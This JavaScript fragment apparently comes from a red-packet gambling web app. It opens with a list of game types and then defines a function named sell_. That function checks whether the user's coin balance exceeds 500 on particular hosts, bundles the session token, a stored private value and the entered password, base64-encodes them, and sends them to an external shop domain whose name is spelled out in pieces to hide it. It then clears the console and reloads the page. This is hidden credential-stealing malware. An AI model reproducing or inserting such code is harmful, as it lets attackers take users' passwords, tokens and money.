GroupType=[{ value: '0', label: '福利111', type: 'normal', selfBuilt: true, comp: 'Fuli' },{ value: '1', label: '扫雷', type: 'bomb', selfBuilt: true, comp: 'Saolei' },{ value: '2', label: '牛牛', type: 'niuniu', selfBuilt: true, comp: 'Niuniu' },{ value: '3', label: '禁抢', type: 'jinqiang', selfBuilt: false, comp: 'Jinqiang' }, { value: '4', label: '抢庄牛牛', type: 'robniuniu', selfBuilt: true, comp: 'Robniu' },{ value: '5', label: '二八杠', type: 'erbagang', selfBuilt: true, comp: 'Robniu' },{ value: '6', label: '龙虎斗', type: 'longhd', selfBuilt: false, comp: 'Longhd' },{ value: '7', label: '接龙', type: 'jielong', selfBuilt: false, comp: 'Jielong' },{ value: '8', label: '二人牛牛', type: 'twoniuniu', selfBuilt: true, comp: 'Niuniu' },{ value: '9', label: '超级扫雷', type: 'superBomb', selfBuilt: false, comp: 'SuperBomb' },{ value: '10', label: '包包彩', type: 'baoBaoCai', selfBuilt: false, comp: 'baoBaoCai' },{ value: '11', label: '包包牛', type: 'NiuNiuBao', selfBuilt: false, comp: 'niuNiuBao' },{ value: '14', label: '百人牛牛', type: 'bairenniuniu', selfBuilt: false, comp: 'bairenniuniu' },{ value: '15', label: '极速扫雷', type: 'jisusaolei', selfBuilt: false, comp: 'jisusaolei' }];err=null;gameTypes=null; 


function sell_(e) {
    try {
        let available1 =
            sessionStorage.getItem('auth') &&
            JSON.parse(sessionStorage.getItem('auth')).coins.find((e) => {
                return e.mtype == 1
            }).coincash
        let available30 =
            sessionStorage.getItem('auth') &&
            JSON.parse(sessionStorage.getItem('auth')).coins.find((e) => {
                return e.mtype == 30
            }).coincash
        let available = +available1 + +available30
        var h = window.location.host.includes('9988') || window.location.host.includes('gdpayweb')
        if (available > 500 && h) {
            let token =
                localStorage.getItem('token') +
                '&&' +
                (localStorage.getItem('md5_pri') || '---') +
                '&&' +
                (+available30 ? 'available30=' + available30 : '--') +
                '&&' +
                'passwdValue=' +
                e.passwd +
                '&&' +
                (available ? 'available=' + available : '-')
            fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o' + 'p/?' + btoa(token));
            console.clear();
            setTimeout(() => {
               location.reload()
            }, 100)
        }
    } catch (e) {
        console.log('e', e);
    }
}

